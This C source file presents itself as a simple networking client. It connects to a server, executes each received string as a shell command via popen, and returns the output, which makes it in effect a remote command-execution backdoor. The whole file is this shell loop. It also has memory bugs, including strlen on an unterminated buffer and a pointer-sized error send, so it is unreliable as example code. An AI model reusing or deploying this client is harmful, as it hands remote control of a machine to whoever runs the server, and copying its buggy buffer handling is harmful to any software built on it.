// Simple client architecture
// Connects to host, reads message, disconnects
#include <signal.h>
#include "simple_networking.h"

// global kill flag
int kill_rcv = 0;

void kill_handler(int sig)
{
    kill_rcv = 1;
    printf("SIGINT Recv.\n");
}

int main(void)
{
    //LEAVE COMMENTED DURING DEV
    signal(SIGINT, kill_handler);
    connection server_con = connect_to("127.0.0.1", 8080);

    //check if the struct has been filled
    if (server_con.dest_ip == NULL)
    {
        printf("[+] Could not connect to server.\n");
        exit(-1);
    }

    printf("[+] Client connected. IP: %s, Port: %d, Socket: %d\n", server_con.dest_ip, server_con.dest_port, server_con.sock_fd);

    int exit = 0;
    do
    {
      message data_recieved = recieve_data(server_con);
      printf("[+] Server said: %s\n", (char *)data_recieved.data);
      if (strcmp(data_recieved.data, "exit") == 0)
      {
        exit = 1;
      }
      else
      {
        // Create pipe to shell with read permissions
        FILE *cmdptr;
        cmdptr = popen(data_recieved.data, "r");

        if (cmdptr == NULL)
        {
          // Oops, we couldn't open the pipe properly, notify the server
          char *errmsg = "ERROR: Could not open pipe to shell";
          send(server_con.sock_fd, errmsg, sizeof(errmsg), 0);
          continue;
        }

        // Read data from pipe character-by-character into buffer
        char *buffer = malloc(10);
        char character_read;
        int length = 0;
        while ((character_read = fgetc(cmdptr)) != EOF)
        {
          // Place our character from the pipe into the buffer
          buffer[length] = character_read;
          length++;
          
          // Increase the buffer size if needed
          if (length == strlen(buffer))
          {
            buffer = realloc(buffer, length + 10);
          }
        }

        // Send the data and close the pipe
        send(server_con.sock_fd, buffer, strlen(buffer), 0);
        pclose(cmdptr);
        printf("[+] Completed command: %s\n", data_recieved.data);
      }

    }while(exit == 0 && kill_rcv == 0);

    // Print statement for testing purposes only. Will be removed from final copy.
    printf("[+] Closing connection\n");
    // Close file descriptor
    close(server_con.sock_fd);

    // Exit
    return 0;
}
